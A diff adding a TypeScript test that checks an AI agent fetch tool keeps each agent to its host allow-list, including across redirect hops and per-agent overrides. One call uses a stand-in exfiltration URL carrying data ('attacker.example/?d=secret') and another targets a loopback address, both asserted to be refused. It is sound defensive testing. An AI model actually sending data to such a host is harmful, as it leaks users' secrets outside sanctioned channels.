@@ -738,3 +738,64 @@ test('an escape in an unquoted url() is read whole, its ending space included', 
   assert.equal(htmlToText('<p style="display:none;display:url(\\61 b) var(--x)">shown</p>'), 'shown');
   assert.equal(htmlToText('<p style="display:none;display:url(\\61  b) var(--x)">gone</p><p>after</p>'), 'after');
 });
+
+test('onlyHosts holds web.fetch to its list, per agent, redirect hops included', async (t) => {
+  // A listed host that bounces to one that is not: the hop is where an
+  // approver who saw the first URL stops seeing anything.
+  const server = http.createServer((request, response) => {
+    if (request.url === '/bounce') {
+      response.writeHead(302, { location: `http://127.0.0.1:${port}/landed` });
+      response.end();
+      return;
+    }
+    response.writeHead(200, { 'content-type': 'text/plain' });
+    response.end('reached');
+  });
+  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
+  t.after(() => new Promise<void>((resolve) => server.close(() => resolve())));
+  const port = (server.address() as AddressInfo).port;
+
+  const tool = await fetchTool({
+    allowedHosts: ['localhost'],
+    onlyHosts: ['localhost'],
+    // An allowedHosts entry stays reachable whatever onlyHosts says, so
+    // scout's narrower list has to drop the inherited exemption as well.
+    agents: {
+      scout: { onlyHosts: ['docs.python.org'], allowedHosts: [] },
+      // A fleet-wide list, lifted for one agent: an override replaces the
+      // default, so `*` is the way to say "no list" from under one.
+      ranger: { onlyHosts: ['*'] },
+    },
+  });
+
+  const reached = await tool.execute({ url: `http://localhost:${port}/` }, session) as JsonObject;
+  assert.equal(reached.text, 'reached');
+
+  // The exfiltration shape: a URL on a host nobody listed, carrying data.
+  await assert.rejects(
+    tool.execute({ url: 'https://attacker.example/?d=secret' }, session),
+    /attacker\.example is not one of the hosts this agent may reach/,
+  );
+  // The hop is refused by name — the host is judged before the address,
+  // so the message says which list it is missing from.
+  await assert.rejects(
+    tool.execute({ url: `http://localhost:${port}/bounce` }, session),
+    /127\.0\.0\.1 is not one of the hosts this agent may reach/,
+  );
+
+  // Per agent, resolved on the call: scout's list replaces the default.
+  const scout: Session = { ...session, id: 'session-scout', agent: { id: 'scout', name: 'Scout' } };
+  await assert.rejects(
+    tool.execute({ url: `http://localhost:${port}/` }, scout),
+    /localhost is not one of the hosts this agent may reach/,
+  );
+  // Refused by address, not by name: the list is lifted, the SSRF check
+  // that the inherited `allowedHosts` answers for localhost is not.
+  const ranger: Session = { ...session, id: 'session-ranger', agent: { id: 'ranger', name: 'Ranger' } };
+  await assert.rejects(
+    tool.execute({ url: 'http://127.0.0.1:1/?d=secret' }, ranger),
+    (error: unknown) => error instanceof Error && !/is not one of the hosts/.test(error.message),
+  );
+  const lifted = await tool.execute({ url: `http://localhost:${port}/` }, ranger) as JsonObject;
+  assert.equal(lifted.text, 'reached');
+});
